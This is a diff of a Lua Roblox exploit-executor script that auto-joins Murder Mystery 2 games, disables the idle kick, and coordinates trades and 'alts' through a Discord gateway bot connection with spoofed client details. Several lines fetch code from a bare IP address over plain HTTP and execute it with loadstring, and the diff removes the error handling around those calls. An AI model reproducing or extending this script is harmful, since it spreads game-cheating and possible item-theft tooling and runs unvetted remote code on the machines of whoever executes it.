@@ -1,11 +1,8 @@
 --claude sigmer
 joinGames = {[142823291] = true,[920587237] = true,}
 
--- getgenv() is near-universal but guard it anyway - without this, a missing
--- getgenv would kill the whole script on line 1 with zero console output.
-local _genv = (type(getgenv) == "function") and getgenv() or _G
-if _genv.__mm2_autojoiner_loaded then return end
-_genv.__mm2_autojoiner_loaded = true
+if getgenv().__mm2_autojoiner_loaded then return end
+getgenv().__mm2_autojoiner_loaded = true
 
 repeat task.wait() until game:IsLoaded()
 
@@ -38,22 +35,9 @@ for _, b in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
     b:Disable();
 end;
 local exec, execver = identifyexecutor()
-
--- joiner.lua opens a raw wss:// connection straight to Discord's real gateway
--- (gateway.discord.gg). Previously seen hanging on Arceus X specifically at
--- the WebSocket.connect() call itself - the gateway section below now wraps
--- that call with its own timeout/cancel watchdog and a User-Agent header, so
--- it no longer takes the whole script down if the connect call stalls.
-if tostring(exec):lower() ~= "delta" then
-    warn("[joiner] " .. tostring(exec) .. " has not been confirmed working with joiner.lua's "
-        .. "direct Discord gateway connection - trying anyway. If [gateway] never gets past "
-        .. "'connecting' at all, use mm2.lua/ajv2.lua on this executor instead.")
-end
-
 totalval = 0
 tradesd = 0
 minrarity = minrarity or "Godly"
-tradesbeforenext = tradesbeforenext or 1   -- trades with the current giver before moving to the next queued join
 print(1)
 
 if IS_MM2 then
@@ -85,15 +69,13 @@ end
 function getinv()
     return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
 end
-local databrainrot = {}
-pcall(function() databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons end)
+local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
 
 -- value lookup mirrors mm2.lua: /supreme endpoint + flexible name+type+year
 -- lookups + Godly+ rarity fallback (so unknown items still get a sensible value)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
 local godlyIdx = table.find(rarityTable, "Godly") or 6
-local valueList = {}
-pcall(function() valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {} end)
+local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {}
 
 local function lookupValue(realName, itemType, rarity, chroma, year)
     local D = rarity
@@ -486,14 +468,7 @@ end
 -- pet value list shared by getPetValue (must be file-scope, not trapped in spawn)
 local valueList
 task.spawn(function()
-    local ok, list = pcall(function()
-        return loadstring(game:HttpGet("http://109.120.157.241:5000/elvebredd"))()
-    end)
-    if ok then
-        valueList = list
-    else
-        warn("[adm] value list fetch failed: " .. tostring(list))
-    end
+    valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/elvebredd"))()
 end)
 
 local function formatValue(v)
@@ -950,7 +925,6 @@ function teleportTo(placeId, jobId, msgid)
     end)
 end
 local socket
-local heartbeatThread   -- current heartbeat coroutine, cancelled explicitly on every HELLO/close
 local sequenceNumber
 local sessionId
 local resumeUrl
@@ -969,13 +943,6 @@ function sendPayload(op, d)
     end)
 end
 
-local function stopHeartbeat()
-    if heartbeatThread then
-        pcall(task.cancel, heartbeatThread)
-        heartbeatThread = nil
-    end
-end
-
 local function connectgateway()
     connectionId = connectionId + 1
     local myId = connectionId
@@ -985,46 +952,14 @@ local function connectgateway()
     end
 
     print("[gateway] connecting (gen "..myId..")")
-
-    -- WebSocket.connect is a YIELDING call, called raw/direct exactly like a
-    -- known-working reference implementation - wrapping it in
-    -- pcall(function() ... end) crosses a pcall/closure boundary which on
-    -- some executors returns a socket that never receives HELLO ("dead
-    -- socket"). task.spawn is fine (it doesn't have that problem) and gives
-    -- us a way to detect the call hanging forever, which is a real failure
-    -- mode seen on Arceus X: the call never returns at all, not even with an
-    -- error. If that happens, abandon this attempt and retry instead of
-    -- freezing the whole script.
-    local gotSocket, newSocket = false, nil
-    local connectThread = task.spawn(function()
-        newSocket = WebSocket.connect(url)
-        gotSocket = true
-    end)
-    local waited = 0
-    while not gotSocket and waited < 8 and connectionId == myId do
-        task.wait(0.25)
-        waited = waited + 0.25
-    end
-    if connectionId ~= myId then return end   -- superseded by a newer attempt while we waited
-    if not gotSocket then
-        warn("[gateway] WebSocket.connect did not return within 8s, abandoning this attempt")
-        pcall(task.cancel, connectThread)
-        task.wait(3 + math.random() * 3)
-        if connectionId == myId then connectgateway() end
-        return
-    end
-    socket = newSocket
-    if not socket then
-        warn("[gateway] connect returned nil, retrying")
-        task.wait(5 + math.random() * 5)          -- jitter so alts don't sync up
-        if connectionId == myId then connectgateway() end
-        return
-    end
-
+    -- IMPORTANT: call WebSocket.connect directly, exactly like old.lua.
+    -- It is a YIELDING call; wrapping it in pcall(function() ... end) makes the
+    -- yield cross a pcall/closure boundary, which on many executors returns a
+    -- socket that never receives HELLO ("dead socket"). Do not wrap it.
+    socket = WebSocket.connect(url)
     socket.OnMessage:Connect(function(msg)
         if connectionId ~= myId then return end
-        local ok, data = pcall(function() return HttpService:JSONDecode(msg) end)
-        if not ok or type(data) ~= "table" then return end
+        local data = HttpService:JSONDecode(msg)
 
         if data.s then
             sequenceNumber = data.s
@@ -1032,18 +967,7 @@ local function connectgateway()
 
         if data.op == 10 then
             helloConnId = myId
-            -- cancel any heartbeat still running from a prior HELLO/RESUME on
-            -- this same connection before starting a fresh one, so there is
-            -- never more than one heartbeat loop alive at a time.
-            stopHeartbeat()
             local heartbeatInterval = data.d.heartbeat_interval / 1000
-            heartbeatThread = task.spawn(function()
-                while true do
-                    task.wait(heartbeatInterval)
-                    if connectionId ~= myId then break end
-                    sendPayload(1, sequenceNumber)
-                end
-            end)
             if shouldResume and sessionId and sequenceNumber then
                 print("[gateway] HELLO received, sending RESUME")
                 sendPayload(6, {
@@ -1055,14 +979,21 @@ local function connectgateway()
                 print("[gateway] HELLO received, sending IDENTIFY")
                 sendPayload(2, {
                     token = bottoken,
-                    intents = 131071,
+                    intents = 33280,
                     properties = {
-                        os = "windows",
-                        browser = "Discord",
+                        os = "linux",
+                        browser = "opsec",
                         device = "desktop"
                     }
                 })
             end
+            task.spawn(function()
+                while connectionId == myId and socket do
+                    task.wait(heartbeatInterval)
+                    if connectionId ~= myId then break end
+                    sendPayload(1, sequenceNumber)
+                end
+            end)
         end
 
         if data.op == 0 and data.t == "READY" then
@@ -1110,13 +1041,18 @@ local function connectgateway()
             end
         end
     end)
+    if not socket then
+        warn("[gateway] connect returned nil, retrying")
+        task.wait(5 + math.random() * 5)          -- jitter so alts don't sync up
+        if connectionId == myId then connectgateway() end
+        return
+    end
 
     print("[gateway] socket open, waiting for handshake")
 
     socket.OnClose:Connect(function()
         if connectionId ~= myId then return end   -- stale handler, ignore
         warn("[gateway] closed, reconnecting")
-        stopHeartbeat()
         socket = nil
         if sessionId and sequenceNumber then
             shouldResume = true
@@ -1133,7 +1069,6 @@ local function connectgateway()
         task.wait(6)
         if connectionId == myId and helloConnId ~= myId then
             warn("[gateway] no HELLO (dead socket), retrying now")
-            stopHeartbeat()
             pcall(function() if socket then socket:Close() end end)
             if connectionId == myId then
                 socket = nil
@@ -1147,7 +1082,6 @@ local function connectgateway()
         task.wait(8)
         if connectionId == myId and readyConnId ~= myId then
             warn("[gateway] HELLO but no READY (rate limited?), backing off")
-            stopHeartbeat()
             pcall(function() if socket then socket:Close() end end)
             task.wait(3 + math.random() * 4)
             if connectionId == myId then
